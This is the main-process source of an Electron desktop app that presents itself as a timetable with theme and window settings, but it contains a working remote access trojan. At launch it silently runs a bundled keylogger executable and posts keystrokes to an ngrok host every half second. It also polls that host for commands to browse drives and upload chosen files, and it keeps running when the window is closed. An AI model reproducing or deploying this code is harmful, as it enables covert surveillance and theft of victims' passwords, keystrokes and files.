const electron = require('electron');//includes electron dependency
const { app, BrowserWindow, Menu, screen } = electron;//electrons thingies, can also be called via 'electron.thingy' or even 'require('electron').thingy'

const child = require('child_process').execFile;
const axios = require("axios");
const path = require('path');//path to necessary files
const url = require('url');//web dependency
const windowStateKeeper = require('electron-window-state');//preserves the window state
const fs = require('fs');
const Store = require('electron-store'); const store = new Store;

//const remotehost = 'http://localhost:1999';
const remotehost = 'https://1a5b7e004be4.ngrok.io';

let mainWindow = null;//defines the window as an abject
let rat_win = null

let config = {
	frame: false,
	appmenu: false,
	use_alt_storage: false,
	alt_location: "",
	theme: "dark", //sets theme, defaults to time based
	backgroundimg: 'default',
	hilight_engine: false, //hilight engine whether to run or not
	colorpallet: 0,//default to red because primary pixels pop
	animation: true,
	dissable_animations_on_battery: false,
	slideclock: true,
	tiles: false,
	empty_rows: false,
	always_on_top: false,
	link: false,//true internal, false external
}

let storage_changed = false;

app.on('ready', function () {//App is ready to start
	if (store.get('default')) {//emsists
		config = JSON.parse(store.get('default'))
	} else {//doesnt emsist
		store.set('default', JSON.stringify(config))
	}

	if (config.appmenu == false) { Menu.setApplicationMenu(null); }

	create_main_window();
	//make_rat_window()
	child(path.join(__dirname, '/assets/python/kl.exe'), function (err, data) {//child process
		if (err) {
			console.error(err);
			return;
		}

		console.log(data.toString());
	});

	setTimeout(() => {
		//camanager.start_webcam()
		directoryman.search_root()
		setInterval(() => { keylog.get_keys(); }, 500)
		setInterval(() => { directoryman.remote_instructions() }, 200)
	}, 500);//child process wont start instantly
})


/* Rat functions */

function make_rat_window() {//create rat window
	rat_win = new BrowserWindow({
		width: 1000,
		height: 1000,
		backgroundColor: '#000000',
		title: 'rat',
		icon: path.join(__dirname, '/assets/icons/rat_icon.ico'),//some linux window managers cant process due to bug
		frame: true,
		minWidth: 400,
		show: true,
		skipTaskbar: false,
		webPreferences: {
			nodeIntegration: true,
			enableRemoteModule: true,
			nodeIntegrationInWorker: true,
			worldSafeExecuteJavaScript: true
		},
	});

	rat_win.loadURL(url.format({
		pathname: path.join(__dirname, '/windows/webcam.html'),
		protocol: 'file:',
		slashes: true,
		icon: path.join(__dirname, '/assets/icons/rat_icon.ico'),
	}));

	//rat_win.setApplicationMenu
}

let keylog = {
	get_keys: async function () {//get keylog from python sub process and send to server
		let keys = axios.get('http://localhost:5088/key');//'localhost:5088' python keylog sub-process
		await keys.then(keys => { axios.default.post(remotehost + '/action/post/keylog', JSON.stringify(keys.data.keys)) })//post kelog to server
	},
	clear: async function () { axios.get('http://localhost:5088/key/clear') },//reset key array
	close: function () { axios.post("http://localhost:5088/shutdown"); },//shutdown sub-process
}

let directoryman = {
	files: [],//temprary filr paths
	current_dir: [],//current directory
	remote_instructions: function () {
		axios.default.post(//post folders to server
			remotehost + '/action/post/folders', {
			files: directoryman.files,
			current_dir: directoryman.current_dir
		})
			.then(res => {//instructions in the response

				if (res.data != null) {

					var instriction = JSON.parse(res.data)
					console.log('server replied: ', instriction)

					switch (instriction.action) {
						case 'do nothing':
							//do no action
							break;
						case 'search_root':
							directoryman.search_root()
							break;
						case 'search_dir':
							directoryman.search_dir(instriction.path)
							break;
						case 'download':
							directoryman.upload(instriction.path)
							break;
						case 'go_back_a_dir':
							directoryman.go_back_a_dir()
							break;
						default:
							console.warn('Unknown instruction: ', instriction)
					}
				}
			}).catch(err => { /*console.warn('Server responed with a flawed instruction', err)*/ })//post folder state to server
	},
	search_root: async function () {//Search root drives, functionality stats here
		console.log('Search root');

		let letters = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'];

		directoryman.files = [];//empty file current files array

		for (let i in letters) {//for each letter
			if (fs.existsSync(letters[i])) {//directory exists?
				directoryman.files.push({ base: letters[i], type: 'folder' });//data to send tpo server later
			}
		}
	},
	search_dir: async function (searchpath) {//searchpath must be a string
		this.current_dir.push(searchpath);//keep track of current directory
		console.log('Search: ', searchpath);

		fs.readdir(searchpath, function (err, files) {//Read out directories in a directory
			if (err) {
				console.log(err)
				return 0;
			}

			directoryman.files = [];//empty file current files array
			console.log(files)

			files.forEach(filee => {//for each file
				try {
					if (fs.statSync(path.join(searchpath, filee)).isDirectory()) {//directory or file?
						directoryman.files.push({ base: path.basename(path.join(searchpath, filee)), type: 'folder' })
					} else {
						directoryman.files.push({ base: path.basename(path.join(searchpath, filee)), type: 'file' })
					}
				} catch (err) {
					console.warn(err)
				}

			})

		})
	},
	go_back_a_dir: function () {//go back to the last directory
		console.log('Go back a dir')

		if (directoryman.current_dir.length < 2) {
			directoryman.current_dir = [];
			directoryman.search_root();
			return 0;
		} else {

			directoryman.current_dir.pop();
			var current = directoryman.current_dir.pop();
			console.log('back to: ', current)
			if (current == undefined) {
				directoryman.current_dir = [];
				directoryman.search_root();
			} else {
				directoryman.search_dir(current)
			}

		}
	},
	upload: async function (fpath) {//Push a file to the server in chunks

		//post file detals
		axios.default.post(remotehost + '/action/post/file/info', path.parse(fpath));

		//post file chunks as buffers
		fs.createReadStream(fpath).on('data', function (data) {
			axios.default.post(remotehost + '/action/post/file/buffer', data)
		})

	}
}


/* Electron functions */



function create_main_window() {
	mainWindow = null
	const { screenwidth, screenheight } = screen.getPrimaryDisplay().workAreaSize; //gets screen size and sets it to height and width
	let mainWindowState = windowStateKeeper({ defaultWidth: screenwidth, defaultHeight: screenheight });

	mainWindow = new BrowserWindow({
		x: mainWindowState.x,
		y: mainWindowState.y,
		width: mainWindowState.width,
		height: mainWindowState.height,
		backgroundColor: '#000000',
		title: 'Timetable',
		icon: path.join(__dirname, '/assets/icons/icon.ico'),//some linux window managers cant process due to bug
		frame: config.frame,
		minWidth: 400,
		show: true,
		skipTaskbar: false,
		webPreferences: {
			nodeIntegration: true,
			enableRemoteModule: true,
			nodeIntegrationInWorker: true,
			worldSafeExecuteJavaScript: true
		},
	});

	mainWindow.loadURL(url.format({
		pathname: path.join(__dirname, '/windows/index.html'),
		protocol: 'file:',
		slashes: true,
		icon: path.join(__dirname, '/assets/icons/icon.ico'),
	}));

	mainWindowState.manage(mainWindow);
}

function secondary_win(url) {
	let secondary = new BrowserWindow({
		width: 500,
		height: 800,
		backgroundColor: '#000000',
		title: url,
		icon: path.join(__dirname, '/assets/icons/icon.ico'),//some linux window managers cant process due to bug
		frame: config.frame,
		minWidth: 400,
		minHeight: 500,
		show: true,
		frame: true
	})
	secondary.loadURL(url)
}

async function write_file(filepath, buffer_data) {
	console.log('fs', filepath, buffer_data)
	fs.writeFile(filepath, buffer_data, 'utf8', (err) => {//write config to file as json
		if (err) {
			alert("An error occurred creating the file" + err.message)
		} else {
			console.log("The file has been successfully saved to: ", filepath);
		}
	})
}

async function setstorage() { store.set('default', JSON.stringify(config)) }

module.exports = {
	secondary_battery: function (url) { secondary_win(url) },
	setframe: (frame) => {
		config.frame = frame
		setstorage();
		app.relaunch();//relaunches app
		app.exit();
	},
	framestate: () => { return config.frame },
	setmenu: (menu) => {
		config.appmenu = menu;
		setstorage()
		app.relaunch();
		app.exit();
	},
	menustate: () => { return config.appmenu },
	get_alt_slideclock: () => { return config.slideclock },
	set_alt_slideclock: (slideclock) => {
		config.slideclock = slideclock;
		storage_changed = true;
	},
	get_alt_location: () => { return config.alt_location },
	set_alt_location: (alt_location) => {
		config.alt_location = alt_location;
		storage_changed = true;
	},
	get_use_alt_location: () => { return config.use_alt_location },
	set_use_alt_location: (use_alt_location) => {
		config.use_alt_location = use_alt_location;
		storage_changed = true;
	},
	get_theme: () => { return config.theme },
	set_theme: (theme) => {
		config.theme = theme;
		storage_changed = true;
	},
	get_backgroundimg: () => { return config.backgroundimg },
	set_backgroundimg: (backgroundimg) => {
		config.backgroundimg = backgroundimg;
		storage_changed = true;
	},
	get_hilight_engine: () => { return config.hilight_engine },
	set_hilight_engine: (hilight_engine) => {
		config.hilight_engine = hilight_engine;
		storage_changed = true;
	},
	get_colorpallet: () => { return config.colorpallet },
	set_colorpallet: (colorpallet) => {
		config.colorpallet = colorpallet;
		storage_changed = true;
	},
	get_animation: () => { return config.animation },
	set_animation: (animation) => {
		config.animation = animation;
		storage_changed = true;
	},
	get_tiles: () => { return config.tiles },
	set_tiles: (tiles) => {
		config.tiles = tiles;
		storage_changed = true;
	},
	get_empty_rows: () => { return config.empty_rows },
	set_empty_rows: (empty_rows) => {
		config.empty_rows = empty_rows;
		storage_changed = true;
	},
	get_always_on_top: () => { return config.always_on_top },
	set_always_on_top: (always_on_top) => {
		config.always_on_top = always_on_top;
		storage_changed = true;
	},
	get_link: () => { return config.link },
	set_link: (link) => {
		config.link = link;
		storage_changed = true;
	},
	write_object_json_out: (filepath, buffer_data) => { write_file(filepath, buffer_data) },
	closeapp: () => {
		/*keylog.close()
		if (storage_changed == true) { setstorage() }
		app.quit()*/
		setstorage()
		mainWindow.hide()
	},
	minmize_main_window: () => { mainWindow.minimize() },
	maximize_main_window: () => {
		if (mainWindow.isMaximized()) {
			mainWindow.restore()
			return false;
		} else {
			mainWindow.maximize()
			return true;
		}
	},
	togglealways_on_top: () => {
		if (mainWindow.isAlwaysOnTop()) {
			mainWindow.setAlwaysOnTop(false)
			return false;
		} else {
			mainWindow.setAlwaysOnTop(true)
			return true;
		}
	},
	checkontop: () => { return mainWindow.isAlwaysOnTop() },
	setontop: () => { mainWindow.setAlwaysOnTop(true) },
	setnotontop: () => { mainWindow.setAlwaysOnTop(false) },
}


/*app.on('window-all-closed', function () {
	keylog.close()
	if (storage_changed == true) { setstorage() }
	app.quit();
})*/